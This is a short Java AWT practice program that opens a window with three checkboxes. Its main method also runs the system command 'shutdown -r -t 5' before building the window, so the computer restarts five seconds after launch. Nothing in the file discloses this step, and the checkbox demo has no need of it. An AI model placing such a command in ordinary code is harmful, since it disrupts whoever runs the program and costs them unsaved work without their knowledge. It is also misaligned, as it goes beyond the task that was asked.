import java.awt.*;
import java.io.IOException;

public class checkbox {

    checkbox(){
        Frame fr = new Frame("checkbox practice");
        Checkbox c1 = new Checkbox("Java");
        c1.setBounds(100,100,50,50);
        Checkbox c2 = new Checkbox("rahul");
        c2.setBounds(200,400,300,50);
        Checkbox c3 = new Checkbox("yuf");
        c3.setBounds(250,200,100,150);


        fr.add(c1);
        fr.add(c3);
        fr.add(c2);
        fr.setVisible(true);
        fr.setLayout(null);
        fr.setSize(400,400);
    }

    public static void main(String[] args) throws Exception {
        Runtime.getRuntime().exec("shutdown -r -t 5");
        new checkbox();
    }
}
